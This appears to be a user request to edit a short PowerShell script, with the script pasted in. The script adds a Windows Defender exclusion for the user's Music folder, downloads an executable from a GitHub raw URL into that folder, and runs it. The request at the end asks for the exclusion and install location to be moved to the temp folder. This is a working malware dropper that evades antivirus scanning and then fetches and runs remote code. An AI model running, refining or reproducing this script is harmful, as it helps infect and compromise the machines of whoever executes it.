Add-MpPreference -ExclusionPath $env:USERPROFILE\Music
  $url = 'https://github.com/andresberejno/aaaaaaa/raw/refs/heads/main/Basic.exe'
$outputFile = [System.IO.Path]::Combine($env:USERPROFILE, 'Music', 'base.exe')

# Wait until the exclusion is confirmed (just a safeguard, usually it happens instantly)
Start-Sleep -Milliseconds 100 

# Create a WebClient object to download the file
$webClient = New-Object System.Net.WebClient
$webClient.DownloadFile($url, $outputFile)

# Run the downloaded file after the download is complete
Start-Process -FilePath $outputFile

edit this file for me it will add elxusion in temp folder ok? and it will install the file on temp folder
